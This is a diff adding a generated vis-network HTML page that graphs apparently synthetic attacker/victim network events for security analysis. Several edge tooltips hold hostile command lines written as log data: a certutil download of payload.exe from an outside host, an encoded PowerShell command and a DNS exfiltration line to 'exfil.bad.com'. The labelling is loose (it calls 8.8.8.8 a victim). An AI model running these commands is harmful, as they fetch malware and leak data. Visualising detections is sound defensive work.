@@ -1,0 +1,163 @@
+<html>
+    <head>
+        <meta charset="utf-8">
+        
+            <script src="lib/bindings/utils.js"></script>
+            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/vis-network/9.1.2/dist/dist/vis-network.min.css" integrity="sha512-WgxfT5LWjfszlPHXRmBWHkV2eceiWTOBvrKCNbdgDYTHrT2AeLCGbF4sZlZw3UMN3WtL0tGUoIAKsu8mllg/XA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/vis-network/9.1.2/dist/vis-network.min.js" integrity="sha512-LnvoEWDFrqGHlHmDD2101OrLcbsfkrzoSpvtSQtxK3RMnRV0eOkhhBN2dXHKRrUU8p2DGRTk35n4O8nWSVe1mQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+            
+        
+<center>
+<h1></h1>
+</center>
+
+<!-- <link rel="stylesheet" href="../node_modules/vis/dist/vis.min.css" type="text/css" />
+<script type="text/javascript" src="../node_modules/vis/dist/vis.js"> </script>-->
+        <link
+          href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta3/dist/css/bootstrap.min.css"
+          rel="stylesheet"
+          integrity="sha384-eOJMYsd53ii+scO/bJGFsiCZc+5NDVN2yr8+0RDqr0Ql0h+rP48ckxlpbzKgwra6"
+          crossorigin="anonymous"
+        />
+        <script
+          src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta3/dist/js/bootstrap.bundle.min.js"
+          integrity="sha384-JEW9xMcG8R+pH31jmWH6WWP0WintQrMb4s7ZOdauHnUtxwoG2vI5DkLtS3qm9Ekf"
+          crossorigin="anonymous"
+        ></script>
+
+
+        <center>
+          <h1></h1>
+        </center>
+        <style type="text/css">
+
+             #mynetwork {
+                 width: 100%;
+                 height: 750px;
+                 background-color: #222222;
+                 border: 1px solid lightgray;
+                 position: relative;
+                 float: left;
+             }
+
+             
+
+             
+
+             
+        </style>
+    </head>
+
+
+    <body>
+        <div class="card" style="width: 100%">
+            
+            
+            <div id="mynetwork" class="card-body"></div>
+        </div>
+
+        
+        
+
+        <script type="text/javascript">
+
+              // initialize global variables.
+              var edges;
+              var nodes;
+              var allNodes;
+              var allEdges;
+              var nodeColors;
+              var originalNodes;
+              var network;
+              var container;
+              var options, data;
+              var filter = {
+                  item : '',
+                  property : '',
+                  value : []
+              };
+
+              
+
+              
+
+              // This method is responsible for drawing the graph, returns the drawn network
+              function drawGraph() {
+                  var container = document.getElementById('mynetwork');
+
+                  
+
+                  // parsing and collecting nodes and edges from the python
+                  nodes = new vis.DataSet([{"color": "darkred", "font": {"color": "white"}, "id": "10.0.0.5", "label": "ATTACKER: 10.0.0.5", "shape": "triangle", "title": "Attacker Machine"}, {"color": "darkred", "font": {"color": "white"}, "id": "10.0.0.10", "label": "ATTACKER: 10.0.0.10", "shape": "triangle", "title": "Attacker Machine"}, {"color": "darkred", "font": {"color": "white"}, "id": "192.168.1.100", "label": "ATTACKER: 192.168.1.100", "shape": "triangle", "title": "Attacker Machine"}, {"color": "darkred", "font": {"color": "white"}, "id": "10.0.0.15", "label": "ATTACKER: 10.0.0.15", "shape": "triangle", "title": "Attacker Machine"}, {"color": "orange", "font": {"color": "white"}, "id": "185.176.27.18", "label": "VICTIM: 185.176.27.18", "shape": "box", "title": "Victim Machine"}, {"color": "orange", "font": {"color": "white"}, "id": "45.33.32.156", "label": "VICTIM: 45.33.32.156", "shape": "box", "title": "Victim Machine"}, {"color": "orange", "font": {"color": "white"}, "id": "8.8.8.8", "label": "VICTIM: 8.8.8.8", "shape": "box", "title": "Victim Machine"}]);
+                  edges = new vis.DataSet([{"arrows": "to", "color": "gray", "from": "10.0.0.5", "label": "Normal (56)", "title": "Source : 10.0.0.5\nDestination : 10.0.0.10\nClassification: Normal\nPort: 135\nProtocol: TCP\nEventID: 3\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nCommandLine: C:\\Windows\\system32\\svchost.exe -k LocalService", "to": "10.0.0.10"}, {"arrows": "to", "color": "gray", "from": "192.168.1.100", "label": "Normal (63)", "title": "Source : 192.168.1.100\nDestination : 10.0.0.10\nClassification: Normal\nPort: 445\nProtocol: TCP\nEventID: 3\nImage: C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\nCommandLine: C:\\Windows\\system32\\svchost.exe -k LocalService", "to": "10.0.0.10"}, {"arrows": "to", "color": "gray", "from": "10.0.0.15", "label": "Normal (61)", "title": "Source : 10.0.0.15\nDestination : 10.0.0.10\nClassification: Normal\nPort: 135\nProtocol: TCP\nEventID: 5\nImage: C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\nCommandLine: C:\\Windows\\system32\\svchost.exe -k LocalService", "to": "10.0.0.10"}, {"arrows": "to", "color": "red", "from": "10.0.0.15", "label": "Zerologon/Log4Shell (9)", "title": "Source (Attacker): 10.0.0.15\nDestination (Victim): 10.0.0.10\nClassification: Zerologon/Log4Shell\nPort: 443\nProtocol: TCP\nEventID: 1\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nCommandLine: C:\\Windows\\system32\\svchost.exe -k LocalService", "to": "10.0.0.10"}, {"arrows": "to", "color": "gray", "from": "192.168.1.100", "label": "Normal (54)", "title": "Source : 192.168.1.100\nDestination : 10.0.0.15\nClassification: Normal\nPort: 445\nProtocol: TCP\nEventID: 1\nImage: C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\nCommandLine: C:\\Windows\\system32\\svchost.exe -k LocalService", "to": "10.0.0.15"}, {"arrows": "to", "color": "gray", "from": "10.0.0.15", "label": "Normal (80)", "title": "Source : 10.0.0.15\nDestination : 10.0.0.5\nClassification: Normal\nPort: 80\nProtocol: TCP\nEventID: 5\nImage: C:\\Windows\\System32\\cmd.exe\nCommandLine: C:\\Windows\\system32\\svchost.exe -k LocalService", "to": "10.0.0.5"}, {"arrows": "to", "color": "gray", "from": "10.0.0.10", "label": "Normal (53)", "title": "Source : 10.0.0.10\nDestination : 10.0.0.15\nClassification: Normal\nPort: 445\nProtocol: TCP\nEventID: 5\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nCommandLine: C:\\Windows\\system32\\svchost.exe -k LocalService", "to": "10.0.0.15"}, {"arrows": "to", "color": "gray", "from": "10.0.0.10", "label": "Normal (57)", "title": "Source : 10.0.0.10\nDestination : 192.168.1.100\nClassification: Normal\nPort: 135\nProtocol: TCP\nEventID: 3\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nCommandLine: C:\\Windows\\system32\\svchost.exe -k LocalService", "to": "192.168.1.100"}, {"arrows": "to", "color": "gray", "from": "10.0.0.5", "label": "Normal (58)", "title": "Source : 10.0.0.5\nDestination : 10.0.0.15\nClassification: Normal\nPort: 445\nProtocol: TCP\nEventID: 3\nImage: C:\\Windows\\System32\\cmd.exe\nCommandLine: C:\\Windows\\system32\\svchost.exe -k LocalService", "to": "10.0.0.15"}, {"arrows": "to", "color": "gray", "from": "10.0.0.5", "label": "Normal (51)", "title": "Source : 10.0.0.5\nDestination : 192.168.1.100\nClassification: Normal\nPort: 443\nProtocol: TCP\nEventID: 1\nImage: C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\nCommandLine: C:\\Windows\\system32\\svchost.exe -k LocalService", "to": "192.168.1.100"}, {"arrows": "to", "color": "gray", "from": "10.0.0.15", "label": "Normal (41)", "title": "Source : 10.0.0.15\nDestination : 192.168.1.100\nClassification: Normal\nPort: 135\nProtocol: TCP\nEventID: 1\nImage: C:\\Windows\\System32\\cmd.exe\nCommandLine: C:\\Windows\\system32\\svchost.exe -k LocalService", "to": "192.168.1.100"}, {"arrows": "to", "color": "gray", "from": "192.168.1.100", "label": "Normal (61)", "title": "Source : 192.168.1.100\nDestination : 10.0.0.5\nClassification: Normal\nPort: 80\nProtocol: TCP\nEventID: 3\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nCommandLine: C:\\Windows\\system32\\svchost.exe -k LocalService", "to": "10.0.0.5"}, {"arrows": "to", "color": "gray", "from": "10.0.0.10", "label": "Normal (56)", "title": "Source : 10.0.0.10\nDestination : 10.0.0.5\nClassification: Normal\nPort: 80\nProtocol: TCP\nEventID: 1\nImage: C:\\Windows\\System32\\svchost.exe\nCommandLine: C:\\Windows\\system32\\svchost.exe -k LocalService", "to": "10.0.0.5"}, {"arrows": "to", "color": "red", "from": "10.0.0.5", "label": "Zerologon/Log4Shell (4)", "title": "Source (Attacker): 10.0.0.5\nDestination (Victim): 10.0.0.10\nClassification: Zerologon/Log4Shell\nPort: 443\nProtocol: TCP\nEventID: 1\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nCommandLine: C:\\Windows\\system32\\svchost.exe -k LocalService", "to": "10.0.0.10"}, {"arrows": "to", "color": "red", "from": "10.0.0.5", "label": "Zerologon/Log4Shell (7)", "title": "Source (Attacker): 10.0.0.5\nDestination (Victim): 192.168.1.100\nClassification: Zerologon/Log4Shell\nPort: 443\nProtocol: TCP\nEventID: 1\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nCommandLine: C:\\Windows\\system32\\svchost.exe -k LocalService", "to": "192.168.1.100"}, {"arrows": "to", "color": "red", "from": "192.168.1.100", "label": "Zerologon/Log4Shell", "title": "Source (Attacker): 192.168.1.100\nDestination (Victim): 185.176.27.18\nClassification: Zerologon/Log4Shell\nPort: 80\nProtocol: TCP\nEventID: 1\nImage: C:\\Windows\\System32\\certutil.exe\nCommandLine: certutil.exe -urlcache -f http://185.176.27.18/payload.exe C:\\Temp\\payload.exe", "to": "185.176.27.18"}, {"arrows": "to", "color": "red", "from": "10.0.0.15", "label": "Zerologon/Log4Shell (3)", "title": "Source (Attacker): 10.0.0.15\nDestination (Victim): 10.0.0.5\nClassification: Zerologon/Log4Shell\nPort: 80\nProtocol: TCP\nEventID: 1\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nCommandLine: C:\\Windows\\system32\\svchost.exe -k LocalService", "to": "10.0.0.5"}, {"arrows": "to", "color": "red", "from": "10.0.0.10", "label": "Zerologon/Log4Shell (6)", "title": "Source (Attacker): 10.0.0.10\nDestination (Victim): 192.168.1.100\nClassification: Zerologon/Log4Shell\nPort: 443\nProtocol: TCP\nEventID: 1\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nCommandLine: C:\\Windows\\system32\\svchost.exe -k LocalService", "to": "192.168.1.100"}, {"arrows": "to", "color": "red", "from": "10.0.0.5", "label": "Zerologon/Log4Shell (2)", "title": "Source (Attacker): 10.0.0.5\nDestination (Victim): 10.0.0.15\nClassification: Zerologon/Log4Shell\nPort: 445\nProtocol: TCP\nEventID: 1\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nCommandLine: C:\\Windows\\system32\\svchost.exe -k LocalService", "to": "10.0.0.15"}, {"arrows": "to", "color": "red", "from": "10.0.0.10", "label": "Zerologon/Log4Shell (4)", "title": "Source (Attacker): 10.0.0.10\nDestination (Victim): 10.0.0.5\nClassification: Zerologon/Log4Shell\nPort: 445\nProtocol: TCP\nEventID: 1\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nCommandLine: C:\\Windows\\system32\\svchost.exe -k LocalService", "to": "10.0.0.5"}, {"arrows": "to", "color": "red", "from": "192.168.1.100", "label": "Zerologon/Log4Shell (4)", "title": "Source (Attacker): 192.168.1.100\nDestination (Victim): 10.0.0.10\nClassification: Zerologon/Log4Shell\nPort: 445\nProtocol: TCP\nEventID: 1\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nCommandLine: C:\\Windows\\system32\\svchost.exe -k LocalService", "to": "10.0.0.10"}, {"arrows": "to", "color": "red", "from": "10.0.0.15", "label": "Zerologon/Log4Shell", "title": "Source (Attacker): 10.0.0.15\nDestination (Victim): 45.33.32.156\nClassification: Zerologon/Log4Shell\nPort: 80\nProtocol: TCP\nEventID: 1\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nCommandLine: powershell.exe -enc JABjID0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwAkA...", "to": "45.33.32.156"}, {"arrows": "to", "color": "red", "from": "10.0.0.10", "label": "Zerologon/Log4Shell (6)", "title": "Source (Attacker): 10.0.0.10\nDestination (Victim): 10.0.0.15\nClassification: Zerologon/Log4Shell\nPort: 135\nProtocol: TCP\nEventID: 1\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nCommandLine: C:\\Windows\\system32\\svchost.exe -k LocalService", "to": "10.0.0.15"}, {"arrows": "to", "color": "red", "from": "192.168.1.100", "label": "Zerologon/Log4Shell (4)", "title": "Source (Attacker): 192.168.1.100\nDestination (Victim): 10.0.0.5\nClassification: Zerologon/Log4Shell\nPort: 80\nProtocol: TCP\nEventID: 1\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nCommandLine: C:\\Windows\\system32\\svchost.exe -k LocalService", "to": "10.0.0.5"}, {"arrows": "to", "color": "red", "from": "10.0.0.15", "label": "Zerologon/Log4Shell (6)", "title": "Source (Attacker): 10.0.0.15\nDestination (Victim): 192.168.1.100\nClassification: Zerologon/Log4Shell\nPort: 80\nProtocol: TCP\nEventID: 1\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nCommandLine: C:\\Windows\\system32\\svchost.exe -k LocalService", "to": "192.168.1.100"}, {"arrows": "to", "color": "red", "from": "10.0.0.15", "label": "Zerologon/Log4Shell", "title": "Source (Attacker): 10.0.0.15\nDestination (Victim): 8.8.8.8\nClassification: Zerologon/Log4Shell\nPort: 53\nProtocol: TCP\nEventID: 1\nImage: C:\\Windows\\System32\\certutil.exe\nCommandLine: certutil -encode data.zip data.b64 \u0026 nslookup -type=txt exfil.bad.com 8.8.8.8", "to": "8.8.8.8"}]);
+
+                  nodeColors = {};
+                  allNodes = nodes.get({ returnType: "Object" });
+                  for (nodeId in allNodes) {
+                    nodeColors[nodeId] = allNodes[nodeId].color;
+                  }
+                  allEdges = edges.get({ returnType: "Object" });
+                  // adding nodes and edges to the graph
+                  data = {nodes: nodes, edges: edges};
+
+                  var options = {
+    "configure": {
+        "enabled": false
+    },
+    "edges": {
+        "color": {
+            "inherit": true
+        },
+        "smooth": {
+            "enabled": true,
+            "type": "dynamic"
+        }
+    },
+    "interaction": {
+        "dragNodes": true,
+        "hideEdgesOnDrag": false,
+        "hideNodesOnDrag": false
+    },
+    "physics": {
+        "enabled": true,
+        "repulsion": {
+            "centralGravity": 0.1,
+            "damping": 0.95,
+            "nodeDistance": 300,
+            "springConstant": 0.01,
+            "springLength": 250
+        },
+        "solver": "repulsion",
+        "stabilization": {
+            "enabled": true,
+            "fit": true,
+            "iterations": 1000,
+            "onlyDynamicEdges": false,
+            "updateInterval": 50
+        }
+    }
+};
+
+                  
+
+
+                  
+
+                  network = new vis.Network(container, data, options);
+
+                  
+
+                  
+
+                  
+
+
+                  
+
+                  return network;
+
+              }
+              drawGraph();
+        </script>
+    </body>
+</html>
